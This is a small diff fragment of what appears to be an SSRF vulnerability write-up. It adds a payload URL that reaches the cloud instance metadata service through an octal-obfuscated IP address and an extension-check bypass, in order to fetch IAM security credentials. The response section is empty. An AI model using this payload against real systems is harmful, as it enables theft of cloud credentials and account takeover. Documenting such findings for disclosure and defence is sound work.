@@ -47,7 +47,13 @@ security-groups
 </pre>
 <h3>Parsed</h3><pre>ami-id hostname iam/ instance-id instance-type local-hostname local-ipv4 placement/ security-groups</pre>
 
+then:
 
+url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml 
+
+Response:
+
+	
 ```
 
 
